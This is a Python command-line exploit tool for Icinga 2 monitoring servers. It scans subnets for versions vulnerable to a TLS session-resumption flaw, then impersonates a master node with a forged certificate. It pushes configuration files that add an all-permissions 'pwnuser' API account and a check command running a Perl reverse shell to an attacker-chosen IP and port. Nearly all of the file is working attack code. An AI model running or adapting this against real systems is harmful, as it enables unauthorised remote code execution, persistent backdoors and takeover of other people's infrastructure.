import socket
import json
from OpenSSL import SSL
from OpenSSL.SSL import ZeroReturnError, WantReadError
import time
import asyncio
import ipaddress
import os
import subprocess
import tabulate
import click
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.x509 import load_pem_x509_certificate
from cryptography.exceptions import InvalidSignature

import logging

logging.basicConfig(level=os.environ.get("LOGLEVEL", "INFO"))

def calculate_cert_fingerprint(cert_pem, cn):
    try:
        # Load the X.509 certificate from PEM
        if isinstance(cert_pem, str):
            cert_pem = cert_pem.encode('utf-8')
        cert = load_pem_x509_certificate(cert_pem)

        # Compute the SHA-256 digest
        fingerprint = cert.fingerprint(hashes.SHA256())

        # Convert the digest to a hexadecimal string
        cert_fingerprint = ''.join(f'{byte:02x}' for byte in fingerprint)
        return cert_fingerprint
    except Exception as e:
        logging.info(f"Exception: {e}")
        

def generate_self_signed_cert(certfile, keyfile, cn):
    # Check if the certificate and key files already exist
    if os.path.exists(certfile) and os.path.exists(keyfile):
        # Check if the CN matches
        with open(certfile, "r") as f:
            cert_pem = f.read()
            cert = load_pem_x509_certificate(cert_pem.encode('utf-8'))
            logging.info(cert.subject.rfc4514_string())
            if cert.subject.rfc4514_string() == f"CN={cn}":
                return

    # Use OpenSSL via subprocess to generate the certificate
    subprocess.run(
        [
            "openssl",
            "req",
            "-nodes",
            "-new",
            "-x509",
            "-keyout",
            keyfile,
            "-out",
            certfile,
            "-subj",
            f"/CN={cn}",
        ],
        check=True,
    )


def generate_ca_cert(ca_certfile, ca_keyfile, ca_cn):
    # Check if the certificate and key files already exist
    if os.path.exists(ca_certfile) and os.path.exists(ca_keyfile):
        return

    # Use OpenSSL via subprocess to generate the certificate
    subprocess.run(
        [
            "openssl",
            "req",
            "-nodes",
            "-new",
            "-x509",
            "-keyout",
            ca_keyfile,
            "-out",
            ca_certfile,
            "-subj",
            f"/CN={ca_cn}",
        ],
        check=True,
    )

# def create_ssl_context(certfile, keyfile):
#     """
#     Create an SSL context for the connection.
#     """
#     context = SSL.Context(SSL.TLSv1_2_METHOD)
#     context.use_certificate_file(certfile)
#     context.use_privatekey_file(keyfile)
#     return context
def create_ssl_context(certfile, keyfile):
    import ssl

    # Create an SSL context
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    # Load the certificate chain (client certificate and private key)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)
    # Load the CA file for verifying the server
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context


def create_netstring(data):
    data_bytes = data.encode("utf-8")
    length_str = str(len(data_bytes))
    netstring = f"{length_str}:{data},"
    netstring_bytes = netstring.encode("utf-8")
    logging.debug(f"NetString Bytes: {netstring_bytes}")
    return netstring_bytes


def parse_netstring(netstring_bytes):
    # logging.info("NetString Bytes:", netstring_bytes)

    if len(netstring_bytes) == 0:
        return None

    # Find the colon separator
    colon_index = netstring_bytes.find(b":")
    if colon_index == -1:
        raise ValueError("Invalid NetString: No colon found")
    # Extract length
    length_str = netstring_bytes[:colon_index].decode("utf-8")
    try:
        length = int(length_str)
    except ValueError:
        return None
    # Extract data
    start = colon_index + 1
    end = start + length
    data = netstring_bytes[start:end]
    # Verify trailing comma
    if netstring_bytes[end : end + 1] != b",":
        logging.info("Invalid NetString: Missing trailing comma")
        return None
        # raise ValueError("Invalid NetString: Missing trailing comma")
    return data.decode("utf-8")

async def async_ssl_connection_w_exploit(host, port, context):
    # Create an SSL connection asynchronously
    reader, writer = await asyncio.open_connection(host, port, ssl=context)

    try:
        # Send an HTTP request
        writer.write(b'GET /v1 HTTP/1.1\r\nHost: localhost:5665\r\n\r\n')
        await writer.drain()

        # Get the underlying SSL object
        ssl_object = writer.get_extra_info("ssl_object")
        if ssl_object:
            # Save the TLS session for reuse
            session = ssl_object.session

        # Read the response
        response = await reader.read(4096)
        logging.debug("Response:" + response.decode('utf-8'))

    finally:
        writer.close()
        await writer.wait_closed()

    # Reuse SSL session, to exploit the session resumption vulnerability
    context.session = session
    reader, writer = await asyncio.open_connection(host, port, ssl=context)
    logging.info("Session restored.")
    return reader, writer

def pyopenssl_connect_with_session(host, port, context, session=None):
    sock = socket.create_connection((host, port))
    conn = SSL.Connection(context, sock)
    if session:
        conn.set_session(session)
    conn.set_connect_state()
    conn.do_handshake()
    return conn, conn.get_session()

async def make_request_with_pyopenssl(host, port, certfile, keyfile, session=None):
    context = SSL.Context(SSL.TLSv1_2_METHOD)
    context.use_certificate_file(certfile)
    context.use_privatekey_file(keyfile)

    conn, new_session = await asyncio.to_thread(
        pyopenssl_connect_with_session, host, port, context, session
    )

    try:
        conn.sendall(b'GET /v1 HTTP/1.1\r\nHost: localhost:5665\r\n\r\n')
        response = conn.recv(4096)
        logging.debug("Response:" + response.decode('utf-8'))
    finally:
        conn.shutdown()
        conn.close()

    return new_session, context


async def scan_host_for_vuln(host, ssl_context, port=5665, timeout=3):
    logging.info(f"Scanning host: {host}")
    # Create an SSL connection asynchronously
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_context), timeout=timeout
        )
    except asyncio.TimeoutError:
        logging.info(f"Connection timed out: {host}")
        return
    except Exception as e:
        logging.info(f"Failed to connect to host: {host}")
        return
    try:
        # Send Icinga Hello
        jsonrpc_request = {
            "jsonrpc": "2.0",
            "method": "icinga::Hello",
            "params": {"version": 21300, "capabilities": 3},
        }
        json_data = json.dumps(jsonrpc_request)
        netstring_message = create_netstring(json_data)
        writer.write(netstring_message)
        await writer.drain()

        # Read the response
        net_data_response = await reader.read(4096)

        # Parse the netstring response
        response = parse_netstring(net_data_response)
        response_json = json.loads(response)
        logging.info(f"Response JSON: {response_json}")

        # Check if the response indicates a vulnerable server
        # If the version is less than 2.14.3 (21403), the server is vulnerable
        # 2.14.3, 2.13.10, 2.12.11, and 2.11.12 are the patched versions
        # Example response:
        # {'jsonrpc': '2.0', 'method': 'icinga::Hello', 'params': {'capabilities': 3, 'version': 21402}}

        version = response_json.get("params", {}).get("version", 0)
        if version < 21403 and version not in [21310, 21211, 21112]:
            logging.info(f"Vulnerable server detected: {host} Version: {version}")
            return (host, version, True)
        else:
            logging.info(f"Server is not vulnerable: {host} Version: {version}")
            return (host, version, False)
    except Exception as e:
        logging.info(f"Failed to connect to host: {host}")
        return
    finally:
        writer.close()
        await writer.wait_closed()


async def scan_subnet_for_vuln(
    subnet: str,
    csv_format: bool,
    vuln_only: bool,
    port=5665,
    batch=10,
    node_cn="icinga-master",
):
    certfile = "fake-node.crt"
    keyfile = "fake-node.key"
    generate_self_signed_cert(certfile, keyfile, node_cn)

    ssl_context = create_ssl_context(certfile, keyfile)

    # Create a list of tasks for each IP in the subnet
    tasks = []
    # Get the IP addresses in the subnet
    # Batch the tasks in groups of 10

    results = []

    ips = list(ipaddress.ip_network(subnet).hosts())
    for index, ip in enumerate(ips):
        if index % batch == 0:
            results.append(await asyncio.gather(*tasks))
            tasks = []
        tasks.append(scan_host_for_vuln(str(ip), ssl_context, port))

    results.append(await asyncio.gather(*tasks))

    if vuln_only:
        results = [
            [result for result in batch if result is not None and result[2]]
            for batch in results
        ]

    if csv_format:
        _display_results_csv(results, vuln_only)
    else:
        _display_results_tabular(results)


def _display_results_tabular(results):
    table_data = []
    for batch in results:
        for result in batch:
            if result is not None:
                table_data.append([result[0], result[1], "Yes" if result[2] else "No"])

    headers = ["Host", "Version", "Vulnerable"]
    print(tabulate.tabulate(table_data, headers=headers, tablefmt="grid"))


def _display_results_csv(results, vuln_only):
    for batch in results:
        for result in batch:
            if result is not None:
                if vuln_only and not result[2]:
                    continue
                print(f"{result[0]},{result[1]},{result[2]}")

async def _write_netstring_pyopenssl(conn, data):
    # JSON
    dump = json.dumps(data)
    netstring = create_netstring(dump)
    await asyncio.to_thread(conn.write, netstring)

async def trigger_exploit_and_send_hello(host, certfile, keyfile, port=5665, node_cn="icinga-master"):
    session, context = await make_request_with_pyopenssl(host, port, certfile, keyfile)
    conn, _ = pyopenssl_connect_with_session(host, port, context, session)

    jsonrpc_request = {
        "jsonrpc": "2.0",
        "method": "icinga::Hello",
        "params": {"version": 21300, "capabilities": 3},
    }
    await _write_netstring_pyopenssl(conn, jsonrpc_request)
    return conn

async def send_pki_update(node_cn, our_ca, our_ca_key, our_ca_text, conn):
    # We sign the certificate with our CA
    subprocess.run(
        [
            "openssl",
            "req",
            "-new",
            "-key",
            "fake-node.key",
            "-out",
            "fake-node.csr",
            "-subj",
            f"/CN={node_cn}",
        ],
        check=True,
    )

    subprocess.run(
        [
            "openssl",
            "x509",
            "-req",
            "-in",
            "fake-node.csr",
            "-CA",
            our_ca,
            "-CAkey",
            our_ca_key,
            "-CAcreateserial",
            "-out",
            "fake-node-signed.crt",
        ],
        check=True,
    )

    with open("fake-node-signed.crt", "r") as f:
        newcert = f.read()

    # Endpoint 'icinga-master' sent an invalid certificate fingerprint: '' for CN 'icinga-master'
    # Get fingerprint of our cn
    fingerprint = calculate_cert_fingerprint(newcert, node_cn)
    result = {
        "cert": newcert,
        "ca": our_ca_text,
        "fingerprint_request": fingerprint,
        "status_code": 0
    }
    message = {
        "jsonrpc": "2.0",
        "method": "pki::UpdateCertificate",
        "params": result
    }
    await _write_netstring_pyopenssl(conn, message)

async def exploit_host(host, revip, revport, port=5665, node_cn="icinga-master", zone="master"):
    certfile = "fake-node.crt"
    keyfile = "fake-node.key"
    generate_self_signed_cert(certfile, keyfile, node_cn)

    our_ca="fake-ca.crt"
    our_ca_key="fake-ca.key"
    generate_ca_cert(our_ca, our_ca_key, "Fake CA")
    with open(our_ca, "r") as f:
        our_ca_text = f.read()

    count = 0
    while count < 50:
        count += 1
        try:
            conn = await trigger_exploit_and_send_hello(host, certfile, keyfile, port, node_cn)
            endpoint_cn = conn.get_peer_certificate().get_subject().commonName

            logging.info(f"Connected to endpoint: {endpoint_cn}")

            # Read the response
            net_data_response = conn.read(4096)
            # Parse the netstring response
            response = parse_netstring(net_data_response)
            response_json = json.loads(response)
            logging.info(f"Response JSON: {response_json}")

            # Send execute command
            execute_command_jsonrpc_request = {
                "jsonrpc": "2.0",
                "method": "event::ExecuteCommand",
                "params": {
                "host": endpoint_cn,  # Replace with the actual hostname
                "service": "icinga_exploit",  # Replace with the actual service name
                "command_type": "check_command",  # Indicating it's a check command
                "command": "icinga_exploit",  # Replace with the actual command name
                "check_timeout": 60,  # Timeout value in seconds (adjust as needed)
                "endpoint": endpoint_cn,
                "deadline": time.time() + 60,  # Deadline for the command
                "source": "unique-execution-id",  # Replace with a unique UUID
                "macros": {}
            }}
            await _write_netstring_pyopenssl(conn, execute_command_jsonrpc_request)

            for i in range(10):
                net_data_response = conn.read(4096)
                response = parse_netstring(net_data_response)
                if response:
                    response_json = json.loads(response)
                    logging.info(f"Response JSON: {response_json}")

                    # Check incoming messages
                    ## if we get a pki::RequestCertificate we can send our own pki::UpdateCertificate
                    if response_json["method"] == "pki::RequestCertificate":
                        logging.info("Received RequestCertificate")
                        await send_pki_update(node_cn, our_ca, our_ca_key, our_ca_text, conn)
                    elif response_json["method"] == "event::ExecutedCommand":
                        logging.info("Received ExecutedCommand")
                        # Check if the command was our exploit command
                        if response_json["params"]["service"] == "icinga_exploit":
                            # If the command was not found, we can add it
                            if "Check command 'icinga_exploit' does not exist." in response_json["params"]["output"]:
                                # Send update command to add new check command
                                revShell = (
                                    f'use Socket;$i="{revip}";$p={revport};'
                                    'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                                    'if(connect(S,sockaddr_in($p,inet_aton($i)))){'
                                    'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
                                )

                                # Properly escape for JSON and shell
                                escapedRevShell = revShell.replace('$', '$$') # Escape `$` for Icinga Macros
                                escapedRevShell = escapedRevShell.replace('"', '\\"') # Escape `"` for JSON
                                command = f'command = ["perl", "-e", "{escapedRevShell}"]'
                                object = f'object CheckCommand "icinga_exploit" {{\n{command}\n}}'

                                # Send update command to enable API
                                updates = {
                                    "/etc/icinga2/conf.d/api-users.conf": "object ApiUser \"pwnuser\" {permissions = [ \"*\" ]\npassword = \"icinga\"}",
                                    "/etc/icinga2/conf.d/commands.conf": object,
                                    "/etc/icinga2/conf.d/hosts.conf": "object Host \"localhost-pwn\" {address = \"127.0.0.1\"\ncheck_command = \"icinga_exploit\"\n}",
                                    "/etc/icinga2/conf.d/services.conf": "object Service \"icinga_exploit\" {host_name = \"localhost-pwn\"\ncheck_command = \"icinga_exploit\"\ncheck_interval = 30m\nretry_interval = 15s\n}"
                                }

                                jsonrpc_request = {
                                    "jsonrpc": "2.0",
                                    "method": "config::Update",
                                    "params": {"update": {zone: updates}},
                                }
                                logging.info("Sending config update")
                                await _write_netstring_pyopenssl(conn, jsonrpc_request) 
                                
                                # this will reload icinga so we need to reconnect, so lets break out of the loop
                                break
                await asyncio.sleep(0.5)

            # Now that we have sent the update, we need to reconnect
            await asyncio.sleep(2)

        except ZeroReturnError:
            logging.info("Connection closed by server, this usually indicates that there is a satellite/master already connected. Or Icinga is reloading. Reconnecting")
        except Exception as e:
            logging.info(e)


@click.group()
def cli():
    pass


@cli.command()
@click.option("--subnet", prompt="Subnet to scan")
@click.option("--csv", is_flag=False, help="Print results in CSV format.")
@click.option("--vuln", is_flag=True, help="Print only vulnerable hosts.")
@click.option("--port", default=5665, help="Port to scan.")
@click.option("--batch", default=10, help="Batch size for scanning.")
def scan(subnet, csv, vuln, port, batch):
    asyncio.run(scan_subnet_for_vuln(subnet, csv, vuln, port=port, batch=batch))


@cli.command()
@click.option("--host", prompt="Host to exploit")
@click.option("--port", default=5665, help="Icinga port")
@click.option("--node-cn", default="icinga-master", help="Node CN to impersonate")
@click.option("--zone", default="master", help="Zone to target")
@click.option("--revip", prompt="Reverse shell IP")
@click.option("--revport", prompt="Reverse shell port")
def exploit(host, port, node_cn, revip, revport, zone):
    asyncio.run(exploit_host(host, port=port, node_cn=node_cn, revip=revip, revport=revport, zone=zone))


if __name__ == "__main__":
    cli()
